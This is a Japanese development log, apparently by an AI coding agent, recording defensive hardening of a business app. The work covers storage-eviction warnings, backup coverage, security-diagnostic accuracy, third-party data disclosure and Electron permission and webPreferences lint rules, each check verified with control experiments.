**「best-effort のとき警告が出る」だけを見ると足りない。** それでは
**常に警告を出す実装**でも、**常に `best-effort` を返す実装**でも通る。
そこで 2 つの文脈を走らせ、**値と表示が連動する**ことを見た:

| 文脈 | `persisted()` | 期待する `durability` | 期待する警告 |
|---|---|---|---|
| A. 既定 (実環境) | `false` | `best-effort` | **出る** |
| B. 偽装 (`addInitScript`) | `true` | `persistent` | **出ない** |

B は `context.addInitScript` で `navigator.storage.persisted` を差し替える。
`addInitScript` は毎回の遷移の前に走るので、リロードを挟む `gotoService` でも
効き続ける (`page.evaluate` での差し替えは遷移で消えるので使えない)。

#### 対照実験 —— どちらの壊し方も、片方の文脈でしか鳴らない

1. **常に警告する実装** (`isEvictableStorage` → `durability !== undefined`)
   → A 側 8 項目は**全部緑のまま**、B の「消えない領域では警告を出さない」
   だけが落ちた。
2. **問い合わせない実装** (`requestAndReadDurability` の先頭で `best-effort`
   を返す) → B の 2 項目が落ちた。

**★ 2 で分かったことのほうが重い。** このとき A 側の
「**ブラウザの `persisted()` と一致する**」は**緑のままだった** ——
実環境では `persisted()` が `false` で、決め打ちした値も `best-effort` なので
**たまたま一致してしまう**。つまりこの照合は、**「問い合わせた」と
「同じ答えを決め打ちした」を区別できない**。

今日ここまでで繰り返してきた「**検査が実物ではなく代替物を見ている**」
「**台帳を標本の代わりにはできない**」と同じ形が、**自分が今書いた検査**に
出た。片方の値しか現れない環境で照合しても、それは照合になっていない。
**値が動く文脈を自分で作らないと、対応は測れない。**

なお `dist/standalone.html` が古いまま回そうとしたとき、鮮度検査
(`artifact-freshness.cjs`) が「22 秒古い」と名指しで止めた ——
型エラーでビルドが落ちた対照実験の 1 回目がまさにそれで、
**壊したのに緑**を受け取らずに済んだ。設計どおり。

---

### 警告を出したのに、出す前より危なくなっていた (2026-08-25)

前節で入れた立ち退きの警告を実機で確かめたあと、**自分が書いた対処が本当に
効くのか**を追った。警告はこう終わっていた:

> …消えたときは暗号化された**トークンごと失われます**。
> **バックアップを書き出してください。**

**この一文が誤りだった。** 「トークンごと失われます」の直後に置かれているので、
読んだ人は「書き出しておけばトークンも戻る」と受け取る。**戻らない。**

#### 実装で確かめた (台帳ではなく)

`BackupPanel.onBackup` は `getRecordStore().exportAll()` を書き出す。
`exportAll()` が読むのは `business-hub-data` の `records` ストアだけで、
保管庫は**別のデータベース** (`business-hub-vault` / `META_STORE` +
`TOKEN_STORE`) に在る。**構造的に入らない。**

台帳の側も同じことを言っていた —— `BACKUP_EXCLUSIONS` の **1 番目**が
「**API キー (Vault 管理のため)**」である。ただし台帳は人が書いた文なので、
**実物で確かめた**: 保管庫へトークンを入れ、レコードを 1 件入れ、実際に
バックアップを作って、レコード (`1234`) は在りトークンは無いことを見る。

#### 立ち退きは生成元ごと起きる —— 覆えているのは 4 分の 1

| 保存先 | 中身 | バックアップ |
|---|---|---|
| `business-hub-data` | 業務レコード | **入る** |
| `business-hub-vault` | API キー・トークン | 入らない |
| `business-hub-library` | ライブラリの書類 | 入らない |
| `business-hub-preferences` | プロキシ設定・FSA のハンドル | 入らない |
| localStorage (20 キー) | 会話履歴・下書き・気分・ウォッチリスト… | 入らない |

**守られたつもりで失う**のがいちばん悪い。本当の警告が「対処済み」の感覚に
置き換わるので、**警告を出す前より危ない**。

#### 直した

- 文言を `EVICTION_RECOVERY` (表) にして `shared/storageDurability.ts` へ。
  **何が戻せて何が戻せないか**を行ごとに持ち、戻せない行は**その後どうするか**
  (「各サービスで登録し直すことになります」) を必ず書く
- 警告を `EvictionNotice` に切り出した —— 暗号化できる場合とできない場合の
  **2 か所に同じ文が写されていた**ので、1 か所から描く
- 「消えるのは保管庫だけではない (生成元の保存領域ごと)」を明示

#### 縛り方 —— 台帳どうしを検査で突き合わせる

`src/shared` から renderer は import できない (境界検査) ので、
`EVICTION_RECOVERY` と `BACKUP_EXCLUSIONS` の整合は**両方を読める検査**が持つ
(`backupCoverage.test.ts`)。片方だけ直した日に鳴る。

対照実験 2 本 —— (1) レコードにトークンを混ぜると「バックアップに現れない」が
落ちる (検査が空振りでないこと)、(2) 表の API 行を `recoverable: true` に
すると 2 件落ちる。

e2e にも**退行の番人**を置いた: 「バックアップを書き出してください」という
言い切りが本文に**現れないこと**。戻せる物・戻せない物の**両方**が名指しで
出ていることも見る (片側しか出ない表は「全部戻せる」か「全部諦めろ」に読める)。

#### ついでに 1 つ直した —— `<ul>` を `<p>` の中に置いていた

表を `<ul>` で描いたが、置き場所は `<p>` の中だった。React は DOM API で組む
ので**製品ビルドでは動く**が、開発ビルドの `validateDOMNesting` が
`console.error` を吐き続ける。**製品ビルドで測っている限り見えない**種類の
不具合なので、行頭記号で並べる形に変えて実測で確かめた
(`document.querySelectorAll('p ul, p li, p div, p p').length === 0`)。

#### 文言を直しても、同じ穴は塞がっていなかった —— 保存先の台帳 (ゲート 33)

上の一件を直したあと、**直したのは文言だけ**だと気づいた。同じ間違いが再び
起きる構造はそのまま残っていた:

- このアプリが何をどこへ残しているかを、**機械が知っている場所が無い**
- 利用者向けの `BACKUP_EXCLUSIONS` は**人が書いた散文**で、3 行目の
  「…など**ブラウザ内の設定**」に何が入るかは読めない
- **新しい保存先を足しても何も鳴らない** —— 資格情報を持つ保存先が増えても、
  開示にもバックアップの範囲にも立ち退きの説明にも反映されないまま出荷できる

`npm run lint:storage` (`scripts/lint-storage-ledger.cjs`) を足した。
renderer を走査して `indexedDB.open` / `localStorage` / `sessionStorage` の
保存箇所を集め、**28 件の台帳と双方向で照合**する。

#### 台帳にして初めて見えた 2 つ

1. **`business-hub-preferences` に資格情報が居た。** ここには**プロキシの
   共有秘密** (平文) と**保存先フォルダの許可**が入る。`BACKUP_EXCLUSIONS`
   では 3 行目の「ブラウザ内の設定」に埋もれており、例に挙がっているのは
   会話履歴・下書き・気分・ウォッチリストだけ。**端末を移した人は、
   プロキシが動かない理由を画面から知れなかった。** 行を独立させた。
2. **`sessionStorage` の `pkce.verifier`** は 4 つ目の保存媒体だが、
   どの台帳にも載っていなかった。タブを閉じれば消えるので立ち退きや
   バックアップの話には乗らないが、**握られれば傍受した認可コードを
   トークンへ交換できる** —— PKCE が防ごうとしている物そのものである。
   秘密なのは 4 つのうち 1 つだけなので、まとめず 4 行に分けた。

#### 「追えない」を静かに飛ばさない

鍵が助数関数を通る箇所 (`loadIds(key)` / `storageKey(k)`) は走査から値が
見えない。**飛ばすと「全部覆った」と読めてしまう**ので、`INDIRECT_SITES` に
**箇所ごと登録**し、そこへ流れる鍵と理由を書かせる。登録が実在しなくなれば
それも鳴る (双方向)。

#### 途中で 3 回、測り手のほうが間違っていた

1. **横断の表で定数を引いて取り違えた** —— `LS_KEY` は 3 つのファイルで
   別の値に使われており、候補が 3 つ出た。**呼び出し元のファイルを先に見る**
   のが正しい (自己テストに固定した)。
2. **引数の切り出しが内側の括弧で切れた** —— `[^,)]+` だと
   `storageKey(k)` が `storageKey(k` になる。深さを数える形へ。
3. **鍵の接頭辞を推測で書いた** —— `servicehub.pkce` と書いたが、実物は
   `pkce.` だった。ソースを読んで直した。**推測で台帳を埋めない。**

#### ゲートが、別のゲートの禁じる物を持ち歩かない

自己テストの合成標本に `indexedDB.open(` の字面を入れたら
`lint:forbidden` が鳴った ——「保管層の外で保管領域を直接触る」規則で、
**正しく鳴っている**。字面を持たずに同じ物を組み立てる形にした
(`lint:charset` が禁じる文字を符号位置から作るのと同じ)。

自己テスト 18 件 + **実ファイルでの対照** (台帳から `business-hub-vault` を
外すと鳴る)。合成だけだと「実物には当たらない正規表現」を書いても気付けない。

#### 監査報告そのものが、在庫を 2 つ落としていた (2026-08-25)

保存先の台帳ができたので、**それを既存の文書へ当てた**。
`docs/DATA_PROTECTION.md` は「漏洩・損壊・消失は防げるか」に答える監査報告で、
冒頭に「現状サマリ（実コード所見）」の表を持つ。

突き合わせたら、**4 つの IndexedDB のうち 2 つが載っていなかった**:

- **`business-hub-library`** —— 利用者の**書類 (blob) を平文で**持つ
- **`business-hub-preferences`** —— **プロキシの共有秘密を平文で**持つ

`sessionStorage` は**媒体ごと**無かった (`pkce.verifier` を含む)。
会話履歴・下書き・気分の記録といった**利用者が書いた内容**も挙がっていない。

**載っていなければ、問われもしない。** 「暗号化されているか」「消えたら
どうなるか」は、在庫に挙がった物にしか向けられない。**在庫の欠落は評価の
欠落である。** 同じ形を今日 3 回踏んだ ——

1. 立ち退きの警告が、覆っていないバックアップを指していた
2. `BACKUP_EXCLUSIONS` が資格情報を「設定」に埋めていた
3. 監査報告の在庫が 2 つ落ちていた

**3 回とも「文書が実物より小さい」**。文書は書いた時点の実物を写すが、
実物だけが増えていく。

#### 直した + 二度と落ちないようにした

- 在庫の節を書き足した (IndexedDB 4 件は**保護・立ち退き・バックアップ**の
  3 列つき / localStorage 20 件は性質ごと / sessionStorage 4 件)
- 台帳に **`sensitive`** を足した ——「(a) 資格情報・鍵材料、または
  (b) 利用者が書いた内容や業務の記録」。**線を引かないと、配色まで
  監査報告に載せる話になる**
- ゲートに規則 9: **`sensitive` な保存先は監査報告に名前で載っていること**

#### 対照は両側に要る

台帳を削る対照 (`business-hub-vault` を外すと鳴る) だけでは、
**文書を読んでいることを示せない** —— 規則 9 を丸ごと消しても 1 本目は通る。
そこで**文書の側を削る**対照も置いた (監査報告から `business-hub-library` の
名前を消すと鳴る)。自己テスト 22 件 + 実ファイル対照 2 本。

なお在庫を書くときに**書かなかったこと**がある —— `business-hub-preferences`
の共有秘密は「保管庫へ移すべきでは」と書きたくなるが、それには
「解錠前に proxy を使う経路」の可否を決める必要がある。
`network/proxy.ts` の冒頭に**そう書いて現状に留めた過去の判断**があるので、
独断で覆さず、**漏れたときに何が起きるかの実測**をそのまま在庫へ写した
(Worker が宛先を独立に検査するので秘密だけでは SSRF にならない)。

#### 開示は、利用者が居る場所でしないと開示にならない

在庫を監査報告へ書いたが、**書類を置く人が見るのはライブラリの画面**である。
設定画面や `docs/` まで読みに行く前提の開示は、開示していないのとあまり
変わらない。ライブラリの画面に 3 つ足した:

- **「⚠️ ここのファイルは暗号化されません」** —— 同じアプリの設定画面が
  「✅ トークンは暗号化されています」と出すので、**書類も同じだと受け取るのが
  自然**である。実際は `Blob` をそのまま置いている
- **立ち退きは自動削除とは別の消え方** —— 画面には既に
  「50 MB / 100 件を超えると古いものから自動削除」と書いてあった (正しい)。
  だが**それはアプリの仕様**で、ブラウザの立ち退きは**まとめて**消す。
  片方だけ書くと、もう片方に備えられない
- **バックアップには入らない** —— 「残したいならダウンロードして端末へ」

e2e に 4 項目 (暗号化されないと言っている / バックアップに入らないと
言っている / アプリ側の上限 / ブラウザ側の立ち退きを**別に**言っている)。
実機で描画と入れ子も確認 (`p ul, p li, p div, p p` が 0 件・console.error 0 件)。

---

### 同じ端末・同じ設定なのに、たどり着き方で診断が変わっていた (2026-08-25)

保存先の台帳が「`business-hub-data` は平文」と言うので、そこを守るはずの
**レコード暗号化**を追った。`recordEncryption.ts` はエンジン・KCV・
再暗号化まで実装済みだが、**`enableEncryption` の呼び出し元はテストを除いて
0** である。つまり `isEncryptionEnabled()` は常に false。

そこから 3 つ出た。**いちばん重いのは、探しに行って見つけたものではなく、
実機で画面を読んで見つけたもの**だった。

#### 1. 診断が、経路によって別の答えを出していた

実測 (実ブラウザ・同じ端末・同じ設定・同じ瞬間):

```
アプリ内で移動して開く   → 自動ロック ✅   スコア 10 / 100
直接ロードして解錠する   → 自動ロック ⚠    スコア  0 / 100
```

原因は**読む時刻**である。自動ロックは `App` の `useEffect` (解錠後) で
始まるが、`SecurityPage` は `useMemo(..., [])` で**初回描画中**に読む ——
あらゆる効果より前で、しかも React は**子の効果を親より先に**走らせる。
アプリ内移動では親の効果が既に走り終えているので見え、
**再読み込みやブックマークの経路では見えない**。

このファイルの冒頭には、**まさに同じ症状を直した記録**がある ——
「呼び出し元が `autoLockEnabled` を `false` 固定で渡しており、診断が
『自動ロック: 未対応』と告げていた」。あのとき直したのは**組み立ての場所**
(画面の外へ出した) で、**読む時刻**は誰も見ていなかった。
**構造は直り、症状は残った。**

**「読む関数がある」ことと「正しい時刻に読む」ことは別である。**
`autoLock.ts` に購読の口を置き、画面は `useSyncExternalStore` で購読する。
組み立ては `dbPosture.ts` のまま (画面の中で入力を作ると、実測を定数へ
戻しても誰も気付かない —— 監査前が実際にそうだった)。

#### 2. マスターパスワードを「導出」していた

`masterPasswordSet: encrypted` ——「暗号化が有効ならマスターパスワードは
設定済み」。**片側の含意としては正しい**が、等号として使うと逆が言えない。
レコード暗号化が配線されていないので `encrypted` は常に false、
つまり**この欄は常に false** だった。

ブラウザ版は**マスターパスワードを設定しないと保管庫が作れず、この画面にも
到達できない**。診断は、必ず設定している利用者に向かって
「マスターパスワード: 未設定 (high)」と告げていた。
保管庫が解錠されていること (`isUnlocked()`) は設定したことの直接の証拠なので、
それを見る。デスクトップ版にマスターパスワードの概念は無いので false のままで正しい。

#### 3. いちばん重い助言が、存在しない設定を指していた

`encryption` は critical・重み 30 で**改善候補の先頭**に出る。その文面が
「**設定でレコード暗号化を有効化し**、マスターパスワードで封緘してください」
——**その設定は無い**。利用者は「いちばん重要」と示された対処を探しに行き、
見つけられない。

同日に直した「バックアップを書き出してください (そのバックアップにトークンは
入らない)」と同じ形である。**従えない助言は、助言が無いより悪い** ——
探す時間を奪ったうえ、他の助言まで当てにならないものに見せる。

配線は機能追加であり持ち主が決めることなので**作らない**。代わりに現状と
今できること (機微なレコードを置かない / パスワード付きでバックアップを
書き出す) を書いた。

#### 4. 注記のほうが古くなっていた

画面の脚注は「自動ロック・整合性・クラウドバックアップは**未配線のため**
保守的に改善候補として表示」と書いたままだった。自動ロックは既に実測に
変わっている。**「確認できないので悪く出している」と「確認したうえで悪い」は
別の話**で、混ぜると利用者はどちらも本気にしなくなる。実測している項目と、
まだ観測していない項目を分けて書いた。

#### 留め方 —— 「同じ」だけでは足りない

e2e に `securityPosture` 節 (13 節目・7 項目)。**経路によらず同じ答えを出す**
という性質そのものを見る。ただし「同じ」だけを見ると**両方 ⚠ の実装でも通る**
ので、実際に動いている物が ✅ で出ていることと、存在しない設定へ誘導して
いないことも併せて見る。

対照 2 本 —— 購読を外すと 3 項目が落ち (経路差が再現)、`masterPasswordSet` を
導出へ戻すと 1 項目が落ちる。単体検査は「欄が true になる」だけでなく
**点数に効いている**ことまで見る (欄が変わっても診断が使っていなければ
利用者の画面は変わらない)。

#### 満点を取れない理由が、利用者の側に無かった (2026-08-25)

前節の続きで、残る診断入力 (`integrityVerified` / `cloudBackup`) を追った。
「まだ観測していない」と注記されている 2 つで、**`autoLockEnabled` も直前まで
同じ札を貼られていた**ので疑う価値がある。

結果は違った ——**観測できないのではなく、仕組みが無い**。

- `cloudBackupToPostureInputs` は診断のために書かれ検査もあるのに、
  **呼び出し元がテストを除いて 0**。ただし送信路そのものが無いことは
  2026-08-22 に実測済みで、`configuredSinks: []` は嘘ではない (正しい判断)
- レコード単位の改ざん検知は未実装

#### 数えたら、7 観点のうち 5 つがそうだった

| 観点 | 重み | この版に在るか |
|---|---|---|
| 業務レコードの保存時暗号化 | 30 | **無い** (有効化画面が未配線) |
| レコードの改ざん検知 | 15 | **無い** |
| クラウドバックアップの暗号化 | 10 | **無い** (送信路が未実装) |
| クラウドバックアップ構成 | 10 | **無い** |
| クラウドバックアップ鮮度 | 10 | **無い** |
| マスターパスワード設定 | 15 | 在る |
| 自動ロック | 10 | 在る |

**到達しうる最大点は 25。** すべて正しく設定した利用者にも
「25 / 100 · グレード D」が出る。しかも改善候補は**重み降順**なので、
**直せない 5 件が上を占め、今できる 2 件が下に埋まる**。

診断は「あなたの設定が悪い」と読まれるが、足りていないのは**アプリの機能**
である。**直せないものを混ぜて並べると、利用者は一覧ごと信じなくなる。**

#### 3 つ目の「従えない助言」

前節で `encryption` を直したが、同じ形が**まだ 2 つ**残っていた:

- **改ざん検知**: 「バックアップ/レコードの整合性チェック (SHA-256) を
  **有効化してください**」—— バックアップの SHA-256 は `backup.ts` で
  **必須**であり既に常時効いている。未実装なのはレコード単位のほう。
  **片方は既に有効・片方は存在しない**、どちらの意味でも従えない
- **バックアップ鮮度**: 札は「バックアップ鮮度」、助言は「直近が古い/未実施」。
  実際に見ているのは `cloudBackup` だけで、**`BackupPanel` の手動書き出しは
  数えていない**。毎日きちんと書き出している利用者にも「未実施」と告げていた

#### 直した

- 観点に **`availability: 'available' | 'not-built'`** を持たせた
- 一覧を**「いま設定でできること」と「この版に無い保護 (設定を変えても
  直せません)」に分けた**
- **到達しうる最大点**を画面に出した —— これを書かずに「25 / 100 · D」とだけ
  見せると、すべて設定した利用者が「自分の設定が悪い」と読む
- 札を実態へ: 「バックアップ鮮度」→「**クラウド**バックアップ鮮度」、
  「改ざん検知 (整合性チェック)」→「**レコードの**改ざん検知」
- 助言から「有効化してください」「構成してください」を外し、
  **今できる代替**を書いた (手元のバックアップは設定画面で暗号化できる)

#### 注記を 2 度直した

前節で脚注を「実測している項目 / まだ観測していない項目」に分けたが、
**この節の結論はそれも誤りだった** —— 改ざん検知とクラウドは「観測して
いない」のではなく**存在しない**。**「確認できないので悪く出している」と
「確認したうえで無い」を混ぜない**と書いた当人が、その脚注で混ぜていた。

#### 留め方

単体 6 件 (分割が漏れない / この版で直せるのは 2 つ / 最大点は available の
重み合計 / できることを全部やると最大点になる / **助言が存在しない設定へ
誘導していない** / 重み降順が保たれる)。e2e に 4 項目。
対照 —— 全観点を `available` に倒すと 3 項目が落ちる。

---

### 「送信しません」の隣で、黙って送っていた (2026-08-25)

今日ここまでの欠陥はどれも同じ形だった ——**画面が、測っていないことを
主張する**。形が見えたので、残りの主張を狙って当てにいった。

セキュリティ画面には 3 つ並んでいる:

```
パスワード強度チェッカー … 「この端末内だけで評価し、外部に送信しません」
メール漏洩チェック (HIBP) … 入力したアドレスを第三者へ送る
URL スキャン (VirusTotal) … 入力した URL を第三者へ送る
```

#### 約束のほうは、本当だった

実ブラウザで `ZZprobeSecret9182734QQ!` を**実キー入力**で打ち込み、3 秒待って
測った —— 外部通信 **0 件**、localStorage / sessionStorage / 全 IndexedDB を
走査して秘密が残った場所 **0 件**。空振りでないことも確かめた
(強度が `100/100` と算出されている = 欄を取り違えていない)。

#### VirusTotal も、良くできていた

説明が**入力欄より前**にあり、理由までコードに書いてある ——
「送信は取り消せないので、説明は必ず入力欄より前に置く」。
投入した URL が VT の利用者から検索できることまで書いてある。

#### HIBP には、何も無かった

**すぐ上が「送信しません」と約束している。** 黙っていれば、利用者は
その約束が**ページ全体に及ぶ**と読む。同じ画面・同じ種類の操作
(利用者の入力を第三者の API へ送る) で、**片方だけ配慮が抜けていた**。

VirusTotal と同じ形で、入力欄より前に置いた。**書けることだけを書く** ——
HIBP 側が検索語をどう扱うかはこのリポジトリからは確かめられないので
**主張しない**。確かなのは「送られる」ことと「経路に誰が居るか」である。

#### 経路の話が、両方に無かった

ブラウザ版の送信は `getProxyTransport()` —— **利用者が設定した
Cloudflare Worker** を通る。つまり照会したアドレスも URL も、
**そのプロキシの運用者から見える**。HIBP 側に説明を足していて、
VirusTotal 側にも経路の話が無いことに気付いた。両方に書いた。

#### ★ そして、門が開かなかった

説明を実機で確かめようとして、**ボタンが押せない**ことに気付いた。
測ると:

```
setToken('security', '{"hibp":"...","vt":"..."}')  → {"ok":true}
fetchSnapshot('security')                          → not_implemented
```

ページは `keysConfigured` でボタンを `disabled` にする。ブラウザ版は
live fetch を持たないので、この値は**同梱スナップショットの `false` から
永久に動かない**。つまり利用者は、画面の言うとおり鍵を保存し
(**保存は成功する**)、それでもボタンは**永久に押せない**。
画面はそのあいだずっと「API キーが未設定。…保存してください」と出し続ける。

**指示どおりにやったのに、何も変わらない。** 今日 4 度目の
「従えない助言」で、これがいちばん具体的である —— 助言に従う操作が
成功しさえするのに、結果だけが永遠に来ない。

しかも送信側 (`scan-url` / `check-email-breach`) は**この shim に実装済み**で
プロキシ経由で動く。**動く機能が、開かない門の向こうに在った。**

直し方は同じ関数の 20 行上に在った —— `emotions` が
`Boolean(await vault.getToken('emotions'))` で同じことをしている。
Norton の検出だけは端末固有なので同梱スナップショット (`installed: false`)
のまま返す (これは嘘ではない)。

#### 留め方

e2e に `thirdPartyDisclosure` 節 (14 節目・9 項目)。**門が開くこと**
(鍵を入れる前は閉じている → 入れると開く → 実際にボタンが押せる) と、
**送る前に送ると書いてあること**を見る。対照 —— `security` の枝を
落とすと **7 項目が落ちる**。

#### 同じ形が他に無いか、機械で数えた —— そして自分の検査が空だった

`security` の「開かない門」が**類型**なのか**1 件**なのかを確かめた。
形は「画面が、ブラウザ版では更新されない旗で UI を閉じる」である。

走査すると、スナップショットで `*Configured` の旗を持つのは 3 つだけだった:

| サービス | ブラウザ版で開くか |
|---|---|
| `emotions` | ✅ `web-shim` に枝がある (`vault.getToken('emotions')`) |
| `security` | ✅ (今日足した) |
| `assistant` | 旗はあるが、**どの画面も読んでいない** |

`assistant.keyConfigured` はデスクトップの fetcher が返すだけで、
`AssistantPage` は provider 設定を localStorage から自前で読む。
**読まれない旗は門にならない**ので害は無い。

**類型ではなく 1 件だった。** 探して無かったことも記録する。

#### 退行しないように留めた —— が、対照が鳴らなかった

`browserSnapshotGates.test.ts`: `*Configured` の旗を持つサービスは
(1) `web-shim` の `fetchSnapshot` に枝がある、(2) `LIVE_READERS` に居る、
(3) **どの画面も読んでいない**ことを台帳に書く、のいずれか。

**(3) の理由自体を検査する** —— 「読んでいない」は書くだけなら嘘になりうる。

対照を 2 本回した:

1. `security` の枝を消す → **鳴った** (名指しで `['security']`)
2. 読まれている `emotions` を「どの画面も読んでいない」台帳へ入れる →
   **鳴らなかった**

**2 が鳴らないのはおかしい。** 調べると、検出が
`useServiceData('emotions'` という**字面**を探していた。実際の呼び出しは

```ts
const { data, … } = useServiceData(
  'emotions',
  SNAPSHOT.emotions,
);
```

と**改行をまたいでいる**ので 1 件も一致せず、**どのサービスを入れても通る
空の検査**だった。正規表現へ直したら鳴った。

今日「検査が実物ではなく代替物を見ている」を何度も書いたが、**自分が今
書いた検査**でまたやった。**鳴らない対照は、対照ではなく報せである。**

#### 型検査だけが捕まえたものもある

`npm test` (vitest) は型を見ないので 5 件緑のまま通ったが、
`verify:all` の `tsc` が正規表現の捕獲群 (`string | undefined`) を 3 件
指摘した。**「テストが通った」は「正しい」ではない**の実例をもう 1 つ。

---

### 今日足した検査を、自分で当て直した (2026-08-25)

前節で**自分の書いた検査が空だった**ので、今日足したものを全部当て直した。
守っている物を実際に壊し、狙った項目が落ちるかを見る。

| 今日足した検査 | 対照 | 結果 |
|---|---|---|
| e2e `storageDurability` (16) | 2 本 | 鳴る |
| e2e ライブラリの開示 (4) | **今回追加** | 3 件鳴る (4 件目は元からある文面を守る検査なので正しく静か) |
| e2e `securityPosture` (11) | 2 本 | 鳴る |
| e2e `thirdPartyDisclosure` (9) | 1 本 | 7 件鳴る |
| `lint:storage` (22 + 実ファイル 2) | 有り | 鳴る |
| `backupCoverage` (7) | 2 本 | 鳴る |
| `dbSecurityPosture` の分割 (6) | e2e 側 | 鳴る |
| **`dbSecurityPosture` の「誘導していない」** | **今回追加** | **空だった → 直した** |
| `dbPosture` マスターパスワード (2) | e2e 側 | 鳴る |
| **`dbPosture` 購読 (1)** | **今回追加** | 鳴る |
| **`browserSnapshotGates` (5)** | 前節 | **空だった → 直した** |
| `storageDurability` 単体 (5) | 有り | 鳴る |

#### 空だった 2 件は、どちらも同じ形

```
× not.toMatch(/設定で.*を有効化してください/)   ← 実物は「有効化し、」
× t.includes(`useServiceData('emotions'`)      ← 実物は改行をまたぐ
```

**どちらも「不在」を主張する検査で、綴りが 1 つ違えば黙る。**
そして黙ったときの見た目は**合格と同じ**である。

肯定形なら、この失敗は起きない ——「有ることの検査は、無ければ必ず鳴る」。
だから主文は肯定形に書き換えた (「この版に無い保護の助言は、**『無い』ことを
明言している**」)。

#### 手で回した対照を、CI へ据えた

対照は**回さなければ分からない**。標本を検査の中へ置いて、
毎回「この規則は実際にその文面へ当たるのか」を確かめるようにした:

```ts
const OLD_WORDINGS = ['設定でレコード暗号化を有効化し、…', 'Drive / Dropbox / … 構成してください。'];
it('★ この検査自体が空でない (実際に使っていた文面に当たる)', () => {
  for (const w of OLD_WORDINGS) expect(w).toMatch(MISLEADING);
});
```

対照済み —— 規則を「有効化**してください**」(= 今日やらかした綴り) に戻すと、
この標本検査が名指しで鳴る。**同じ間違いを二度は通さない。**

e2e 側の番人 (「バックアップを書き出してください」と言い切らない) は
**git で実物を確かめた** —— `3590aaa2` の 941 行目と 995 行目に
その文面が実在し、`75ad827a` で消えている。写し間違いではない。

#### 説明できていないことが 1 つある

CLAUDE.md を編集した直後の `npm test` が **exit 1** を返した。
ところが**出力を `/dev/null` へ捨てていたので、何が落ちたのか分からない**。
その後の全体 4 回 (各 10,717 件) と、疑ったファイル 2 本の組を 6 回、
すべて緑。CLAUDE.md を読むテストは無い (一致したのは注釈だけ) ので、
編集が原因という筋も立たない。

**再現しないが、無かったことにはしない。** 併せて手順の教訓 ——
**終了コードを見るつもりの実行で、出力を捨てない。**

---

### 名指しの規則は、書き方が違う兄弟を取り逃がす (2026-08-25)

検査を当て直したので、**探す側**へ戻った。今日の教訓
「不在の主張は綴り 1 つで黙る」を、他人が書いた規則へも当てる。

#### まず、空振りが続いた (それも結果である)

**caller が決める文字列で表を引く箇所**を全部当たった
(`X[serviceId]` / `X[action]` / `X[id]` …) —— プロトタイプ由来の値が
返って「対応済み」に見える形が無いか。**全部塞がっていた**:

```
AI_PROVIDERS[id]          ← configuredProviders が AI_PROVIDER_IDS で絞る
SERVICE_ALIASES[id]       ← SERVICE_IDS を回すだけ
available.actions[svc]    ← 上の照合で確定した ServiceId
LIVE_READERS[serviceId]   ← canLiveRead 越し (過去に直した記録がコードに在る)
PROFESSIONAL_MAP[id]      ← isProfessionalId / ProfessionalId 型で確定
```

Electron の遷移まわりも同様に堅い ——
`setWindowOpenHandler` / `will-navigate` / `will-redirect` (3xx も) /
`sandbox` / `contextIsolation` / `nodeIntegration: false`。
**探して無かったことも記録する。**

#### 見つけたのは 2 つ

**(1) `enableBlinkFeatures` に規則が 1 件も無かった。**

`lint:forbidden` は危険な `webPreferences` を名指しで 6 種禁じている
(`webSecurity: false` / `webviewTag: true` / `experimentalFeatures: true` …)。
実測すると **`enableBlinkFeatures` だけ 0 件**だった。

`experimentalFeatures` の**兄弟**である —— どちらも「既定で切ってある
未成熟な Blink 機能を開ける」口で、危険の質は同じ。漏れた理由は書き方で、
**値が真偽ではなく機能名の文字列**なので `: true` を並べた規則群からこぼれた。

**名指しの規則は、名指しした綴りしか止められない。**
規則 34 として追加 (標本は肯定・否定の両方 —— 逆向きの
`disableBlinkFeatures` は鳴らないことも留めた)。
対照 —— `main.ts` に 1 行入れると実物の走査が名指しで鳴る。

**(2) `webPreferences` の欄の一覧が留められていなかった。**

`mainWindow.test.ts` は `contextIsolation` / `nodeIntegration` / `sandbox` /
`spellcheck` を個別に確かめるが、**新しい欄が黙って増えたこと**は見ていない。
つまり `lint:forbidden` が名指ししていない欄なら、**両方の網をすり抜ける**。

欄の一覧そのものを字面で固定した。**未知の欄でも人の目を通る**ようになる。
同じ仕掛けが `secrets.ts` の `storageProtection` に在り、**今日それが私の変更
(`durability` 追加) を実際に止めた** —— 効くことが分かっている形である。

対照 —— `enableBlinkFeatures` を足すと、**規則 34 を消しても**この一覧検査が
鳴る。名指しと一覧は**別々に効く**ので、両方置く。

#### 権限も同じ形だった —— 一覧は Electron から採る

`webPreferences` で見つけた非対称 (**名指しの規則はあるが、集合そのものは
留めていない**) を、他の台帳へも当てた。

権限ハンドラは**よく出来ている** —— 20 個の権限を「拒否する」と個別に留め、
そこに **`'unknown'` と `'some-future-permission'` が入っている**ので
**既定拒否そのものが検査されている**。要求側と問い合わせ側が同じ答えを返す
ことも留めてある (片方だけ緩いと `navigator.permissions.query()` が嘘をつく)。

**それでも同じ穴が開いていた。** 留めているのは「この 20 個は拒否」であって、
**許可側の集合ではない**。上の 20 個に**無い**名前を許可側へ足せば、
どのテストも鳴らない。

入れている Electron の型定義 (`setPermissionRequestHandler` の union) と
突き合わせると、**`mediaKeySystem` と `top-level-storage-access` が
20 個の中に無かった**。どちらも今は許可されていないので実害は無いが、
`top-level-storage-access` は**サイトを跨ぐ保存領域への許可**である。

#### 一覧は記憶から書かない

`electron.d.ts` の union を**読んで**対象にした。今日 2 度、
「実物と違う綴り」を記憶から書いて空の検査を作っているので、
**採れる場所があるなら採る**。この形なら Electron を上げて権限が増えた
ときも自動で対象に入り、**既定拒否のままであることが毎回確かめられる**。

床も置いた (15 個未満なら型定義の書式が変わったと見て鳴らす) ——
走査が死んで 0 件になったのを「違反なし」と読まないため。

対照 2 本:

1. `mediaKeySystem` を許可側へ足す → **新しい検査だけが鳴る**
   (古い 20 個の一覧には無い名前なので、既存のどれも鳴らない。
   **塞いだ穴が実在したことの証明**)
2. 問い合わせ側だけ `geolocation` を通す → 3 件鳴る (この面は元から堅い)

---

### 同じ根を扱う 2 つの関数で、片方だけ守られていた (2026-08-25)

台帳の非対称を 3 つ当たった結果、**IPC は完全に留められていた** ——
ハンドラの集合 (`13 個のハンドラが登録される`)・preload が晒す名前の一致・
**素通しの channel 転送が無いこと** (13 本すべて字面のリテラル)。
対照で確かめた (main へハンドラを 1 本足すと集合の検査が鳴る)。
OAuth のループバックも堅い —— `127.0.0.1` 固定・**標準より狭い** Host 判定
(DNS rebinding を明示的に理由に挙げている)・迷子要求の上限・5 分の締切、
そして `state` の照合は**ブラウザ版と同じ `safeStateEquals`** (定数時間) で、
2 実装のあいだに緩い側が無い。

**探して無かったことも記録する。** そのうえで、別の面で 1 件出た。
